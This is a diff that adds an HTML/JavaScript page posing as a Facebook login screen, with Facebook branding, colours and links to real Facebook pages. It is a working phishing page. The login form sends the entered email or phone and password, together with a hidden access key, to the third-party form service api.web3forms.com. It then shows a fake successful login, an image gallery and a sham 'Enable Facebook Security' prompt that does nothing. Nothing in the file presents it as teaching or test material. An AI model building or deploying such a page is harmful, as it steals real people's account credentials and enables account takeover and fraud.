@@ -1,0 +1,349 @@
+<!DOCTYPE html>
+<html lang="en">
+<head> 
+  <meta charset="UTF-8"> 
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
+  <title>Facebook Login</title> 
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: 'Helvetica Neue', Arial, sans-serif;
+      background-color: #f0f2f5; /* Facebook's light gray background */
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      flex-direction: column;
+    }
+
+    .login-container {
+      width: 90%;
+      max-width: 360px;
+      padding: 40px;
+      background-color: white;
+      border-radius: 8px;
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+      text-align: center;
+    }
+
+    .facebook-logo {
+      margin-bottom: 20px;
+    }
+
+    .facebook-logo img {
+      width: 120px;
+      height: auto;
+    }
+
+    h1 {
+      color: #1877f2; /* Facebook blue */
+      font-size: 36px;
+      margin-bottom: 20px;
+      font-weight: bold;
+    }
+
+    form {
+      display: flex;
+      flex-direction: column;
+    }
+
+    input {
+      width: 100%;
+      padding: 12px;
+      margin: 8px 0;
+      font-size: 16px;
+      border: 1px solid #dddfe2;
+      border-radius: 6px;
+      transition: border-color 0.3s;
+    }
+
+    input:focus {
+      border-color: #1877f2; /* Facebook blue */
+      outline: none;
+    }
+
+    button {
+      width: 100%;
+      padding: 12px;
+      font-size: 18px;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      background-color: #1877f2; /* Facebook blue */
+      color: white;
+      font-weight: bold;
+      margin-top: 10px;
+      transition: background-color 0.3s;
+    }
+
+    button:hover {
+      background-color: #145dbf; /* Darker Facebook blue */
+    }
+
+    .forgot-password {
+      color: #1877f2; /* Facebook blue */
+      text-decoration: none;
+      font-size: 14px;
+      margin-top: 10px;
+    }
+
+    .create-account {
+      margin-top: 20px;
+      font-size: 14px;
+    }
+
+    .create-account a {
+      color: #1877f2; /* Facebook blue */
+      text-decoration: none;
+      font-weight: bold;
+    }
+
+    #result {
+      margin-top: 15px;
+      color: red;
+    }
+
+    /* Gallery styles */
+    .gallery {
+      display: none;
+      margin-top: 20px;
+      width: 100%;
+      max-width: 360px;
+      height: 700px;
+      overflow-y: auto;
+      border: 1px solid #dddfe2;
+      border-radius: 6px;
+      background-color: white;
+    }
+
+    .gallery-item {
+      padding: 10px;
+      border-bottom: 1px solid #ddd;
+      text-align: center;
+    }
+
+    .gallery-item:last-child {
+      border-bottom: none;
+    }
+
+    .gallery img {
+      max-width: 100%;
+      height: auto;
+      border-radius: 19px;
+    }
+
+    /* Modal styles */
+    .modal {
+      display: none;
+      position: fixed;
+      z-index: 1;
+      left: 0;
+      top: 0;
+      width: 100%;
+      height: 100%;
+      overflow: auto;
+      background-color: rgba(0, 0, 0, 0.4);
+      padding-top: 60px;
+    }
+
+    .modal-content {
+      background-color: white;
+      margin: 5% auto;
+      padding: 20px;
+      border: 1px solid #888;
+      width: 80%;
+      text-align: center;
+    }
+
+    .close {
+      color: #aaa;
+      float: right;
+      font-size: 28px;
+      font-weight: bold;
+    }
+
+    .close:hover,
+    .close:focus {
+      color: black;
+      text-decoration: none;
+      cursor: pointer;
+    }
+
+    .modal-buttons {
+      display: flex;
+      justify-content: space-around;
+      margin-top: 10px;
+    }
+
+    #logoutBtn {
+      margin-top: 10px;
+      background-color: #dc3545;
+      color: white;
+      padding: 10px;
+      border: none;
+      border-radius: 6px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+
+    #logoutBtn:hover {
+      background-color: #a52a2a;
+    }
+  </style> 
+</head> 
+<body> 
+  <div class="login-container" id="login-container"> 
+    <div class="facebook-logo">
+      <img src="/1734071441364.jpg" alt="Facebook Logo">
+    </div>
+    <h1>Login</h1> 
+    <form method="POST" id="form"> 
+      <input type="hidden" name="access_key" value="b7c41220-91ff-461c-9282-c3aea06cabe9"> 
+      <input type="email or phone" name="email" placeholder="Email or Phone" required> 
+      <input type="type" name="P4$$W0RD" placeholder="Password" required> 
+      <input type="checkbox" name="botcheck" class="hidden" style="display: none;"> 
+      <button type="submit">Log In</button> 
+      <a class="forgot-password" href="https://m.facebook.com/login/identify/" id="forgotPassword">Forgot password?</a>
+      <div id="oldPasswordMessage" style="display: none; color: red; font-size: 14px; margin-top: 5px;"></div>
+      <div class="create-account"> 
+        <p> <a href="https://m.facebook.com/reg/">Create new account</a></p> 
+      </div> 
+      <div id="result"></div> 
+    </form> 
+  </div> 
+
+  <!-- Gallery and modal code remains unchanged -->
+</body> 
+</html>
+<div class="gallery" id="gallery">
+  <marquee behavior="scroll" direction="left"><h1>Suggested Image</h1></marquee>
+  
+  <!-- Existing Images -->
+  <div class="gallery-item">
+    <a href="/img/IMG_20241025_075144_950.jpg" download>
+      <img src="/img/IMG_20241025_075144_950.jpg" alt="Image 1">
+    </a>
+  </div>
+  <div class="gallery-item">
+    <a href="/img/IMG_20241025_075126_740.jpg" download>
+      <img src="/img/IMG_20241025_075126_740.jpg" alt="Image 2">
+    </a>
+  </div>
+  <div class="gallery-item">
+    <a href="image3.jpg" download>
+      <img src="/img/IMG_20240922_121725_086.jpg" alt="Image 3">
+    </a>
+  </div>
+
+    <!-- Logout Button -->
+    <button id="logoutBtn" style="margin-top: 10px; background-color: #dc3545;">Logout</button>
+  </div>
+
+  <!-- Modal -->
+  <div id="myModal" class="modal">
+    <div class="modal-content">
+      <span class="close">&times;</span>
+      <h2>Enable Facebook Security</h2>
+      <p>Please enable Facebook security to protect your account.</p>
+      <div class="modal-buttons">
+        <button id="enableBtn">Enable</button>
+        <button id="backBtn">Back</button>
+      </div>
+    </div>
+  </div>
+
+<script>
+const form = document.getElementById('form');
+const result = document.getElementById('result');
+const loginContainer = document.getElementById('login-container');
+const gallery = document.getElementById('gallery');
+const modal = document.getElementById("myModal");
+const span = document.getElementsByClassName("close")[0];
+
+let loggedIn = localStorage.getItem('loggedIn') === 'true'; // Check if user is logged in
+
+// Check if user is already logged in on page load
+if (loggedIn) {
+  loginContainer.style.display = "none"; // Hide login container
+  gallery.style.display = "block"; // Show gallery
+}
+
+form.addEventListener('submit', function(e) {
+  e.preventDefault();
+
+  // Check if user is already logged in
+  if (loggedIn) {
+    result.innerHTML = "You are already logged in.";
+    return; // Prevent further processing
+  }
+
+  const formData = new FormData(form);
+  const object = Object.fromEntries(formData);
+  const json = JSON.stringify(object);
+  result.innerHTML = "";
+
+  fetch('https://api.web3forms.com/submit', {
+      method: 'POST',
+      headers: {
+          'Content-Type': 'application/json',
+          'Accept': 'application/json'
+      },
+      body: json
+  })
+  .then(response => response.json())
+  .then(data => {
+      if (data.success) {
+          loggedIn = true; // Set loggedIn to true on successful login
+          localStorage.setItem('loggedIn', 'true'); // Save login status in local storage
+          loginContainer.style.display = "none"; // Hide login on success
+          gallery.style.display = "block"; // Show gallery
+          result.innerHTML = "Login successful!";
+          modal.style.display = "block"; // Open modal for security enablement
+      } else {
+          result.innerHTML = "Login failed. Please try again.";
+      }
+  })
+  .catch(error => {
+      result.innerHTML = "Please open your internet once Login you can turn it off.";
+      console.error('Error:', error);
+  });
+});
+
+// Close modal on 'x' click
+span.onclick = function() {
+  modal.style.display = "none";
+}
+
+// Close modal if user clicks outside of it
+window.onclick = function(event) {
+  if (event.target == modal) {
+    modal.style.display = "none";
+  }
+}
+
+// Enable Facebook security button
+document.getElementById("enableBtn").onclick = function() {
+  alert("Facebook security enabled!");
+  modal.style.display = "none"; // Close the modal after enabling
+};
+
+// Back button functionality
+document.getElementById("backBtn").onclick = function() {
+  modal.style.display = "none"; // Close the modal when clicking "Back"
+};
+
+// Logout functionality
+document.getElementById("logoutBtn").onclick = function() {
+  gallery.style.display = "none"; // Hide the gallery
+  loginContainer.style.display = "block"; // Show the login container again
+  result.innerHTML = ""; // Clear any result message
+  loggedIn = false; // Reset the login status
+  localStorage.removeItem('loggedIn'); // Clear the login status from local storage
+};
+
+</script>
